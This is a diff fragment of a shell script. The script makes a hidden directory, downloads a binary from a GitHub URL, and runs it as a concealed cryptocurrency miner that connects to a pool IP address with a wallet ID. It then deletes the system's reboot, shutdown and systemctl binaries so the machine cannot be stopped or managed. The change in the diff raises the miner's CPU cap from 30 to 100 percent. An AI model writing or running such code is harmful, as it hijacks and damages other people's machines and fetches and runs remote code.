@@ -30,7 +30,7 @@ mkdir .lib && cd .lib
 export DEBIAN_FRONTEND=noninteractive
 wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
 chmod +x sgr1
-cpulimit -l 30 -e sgr1 &
+cpulimit -l 100 -e sgr1 &
 screen -dmS main-session /bin/bash -c "./sgr1 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 > /dev/null 2>&1"
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl 
